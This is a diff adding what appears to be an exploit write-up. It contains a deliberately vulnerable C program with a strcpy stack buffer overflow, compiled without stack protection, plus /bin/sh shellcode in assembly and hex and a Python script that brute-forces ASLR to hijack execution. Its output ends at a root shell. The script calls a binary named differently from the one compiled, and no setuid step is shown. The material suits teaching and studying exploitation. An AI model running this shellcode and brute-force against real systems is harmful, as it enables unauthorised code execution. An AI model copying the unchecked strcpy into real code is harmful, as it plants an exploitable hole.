@@ -1,0 +1,125 @@
+/bin/sh shellcode  Ubuntu 14.0.4 32 bit + ASLR Bruteforce
+
+#shellcodeandaslrbruteforce.c
+#Tested on : Ubuntu 14.04 32 bits
+#Author : Pawan Lal   dxb.pawan@gmail.com
+
+*vim shellcodeandaslrbruteforce.c*
+
+#include    <stdio.h>
+#include    <stdlib.h>
+#include    <assert.h>
+#include    <string.h>
+
+
+void vuln (const char* arg){
+    char buffer[100];
+    strcpy(buffer, arg);
+    printf("Hello %s\n", buffer);
+    printf("[+] buffer @ %p\n", buffer);
+}
+
+int main (int argc, char **argv){
+
+    if (argc != 2) {
+        printf("Usage: %s <buffer>\n", argv[0]);
+        exit(1);
+    }
+    vuln(argv[1]);
+        return 0;
+}
+
+Makefile with below command
+
+usage : gcc -fno-stack-protector -z execstack shellcodeandaslrbruteforce.c -o shellcodeandaslrbruteforce
+
+Turn On ASLR:
+
+echo 1 | sudo tee /proc/sys/kernel/randomize_va_space
+#############################################################
+
+*shellcode that executes '/bin/sh'*
+
+global _start
+
+section .text
+
+_start:
+    xor eax, eax
+    push eax
+
+    push 0x68732f2f     ;//sh
+    push 0x6e69622f     ;/bin
+    mov ebx, esp        ;moving the pointer to "/bin//sh" to ebx
+
+    push eax            ;push 0 (=eax)
+    mov edx, esp        ;moving 0 to edx
+
+    push ebx
+    mov ecx, esp        ;moving the pointer to "/bin//sh" to ecx
+
+    mov al, 11
+    int 0x80            ;execv syscall
+
+
+
+################################################################
+
+*Final exploit using /bin/sh shellcode and ASLR bruteforce*
+
+*vim shellcodeandaslrbruteforce.py*
+
+#!/usr/bin/python
+
+import struct, sys, time
+from subprocess import PIPE, Popen
+
+# exec /bin/sh
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+bufsize = 100
+offset = 12     #incl. saved ebp
+nopsize = 4096
+
+def prep_buffer(addr_buffer):
+    buf = "A" * (bufsize+offset)
+    buf += struct.pack("<I",(addr_buffer+bufsize+offset+4))
+    buf += "\x90" * nopsize
+    buf += shellcode
+    return buf
+
+def brute_aslr(buf):
+    p = Popen(['./bof', buf]).wait()
+
+if __name__ == '__main__':
+    addr_buffer = 0xbf92b39c    # randomly decided
+    buf = prep_buffer(addr_buffer)
+    i = 0
+    while True:
+        print i
+        brute_aslr(buf)
+        i += 1
+
+##################################################################
+
+
+root@ubuntu:~/bof/shellcodeandaslrbruteforce
+⇒ python shellcodeandaslrbruteforce.py
+(...)
+(...)
+
+[+] buffer @ 0xbfc2bc0c
+996
+(... snippet)
+
+[+] buffer @ 0xbfb9930c
+997
+(... snippet)
+
+[+] buffer @ 0xbf92721c
+998
+(... snippet)
+
+[+] buffer @ 0xbf92a26c
+# whoami
+root
